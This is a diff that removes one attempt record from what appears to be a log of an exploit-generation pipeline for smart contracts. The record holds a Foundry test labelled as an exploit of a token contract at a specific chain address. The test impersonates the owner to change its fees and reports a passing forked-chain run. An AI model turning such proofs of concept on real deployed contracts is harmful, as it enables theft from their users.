@@ -64,22 +64,5 @@
     "prompt_tokens": 20421,
     "completion_tokens": 5551,
     "total_cost": 0.0
-  },
-  {
-    "attempt_number": 4,
-    "vulnerability_analysis": "Manual PoC refinement validated against forked chain state.",
-    "attack_strategy": "Use corrected setup and exploit path that satisfies preconditions and oracle checks.",
-    "step_by_step_plan": "Prepare state, execute exploit path, assert post-condition/oracle.",
-    "failure_reflection": "",
-    "action": "manual_verify",
-    "tool_calls": [],
-    "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface IDEXRouter {\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint, uint, uint);\n}\n\ninterface Karma {\n    function owner() external view returns (address);\n    function enableTrading() external;\n    function approve(address spender, uint256 amount) external;\n    function changeFees(\n        uint256 _reflectionFeeBuy,\n        uint256 _marketingFeeBuy,\n        uint256 _teamFeeBuy,\n        uint256 _reflectionFeeSell,\n        uint256 _marketingFeeSell,\n        uint256 _teamFeeSell\n    ) external;\n\n    function viewFeesBuy() external view returns (uint256, uint256, uint256, uint256, uint256);\n    function viewFeesSell() external view returns (uint256, uint256, uint256, uint256, uint256);\n}\n\n\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xBC570B260c52A032DE9eF06087e91b2C5104C76B;\n    Karma karma;\n    address owner;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        karma = Karma(TARGET);\n        owner = karma.owner();\n        vm.label(owner, \"Owner\");\n        vm.label(TARGET, \"Karma\");\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        (uint256 rfBuy, uint256 mBuy, uint256 tBuy,,) = karma.viewFeesBuy();\n        (uint256 rfSell,,,,) = karma.viewFeesSell();\n\n        vm.startPrank(owner);\n        karma.changeFees(rfBuy, mBuy, tBuy, rfSell, 0, 0);\n        vm.stopPrank();\n\n        (, uint256 marketingFeeSell,,,) = karma.viewFeesSell();\n        assertEq(marketingFeeSell, 0, \"marketingFeeSell should be zero\");\n    }\n\n\n        \n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}\n",
-    "exit_code": 0,
-    "error": null,
-    "feedback": "Patched PoC passed forge test with fork RPC.",
-    "duration_seconds": 0.0,
-    "prompt_tokens": 0,
-    "completion_tokens": 0,
-    "total_cost": 0.0
   }
 ]
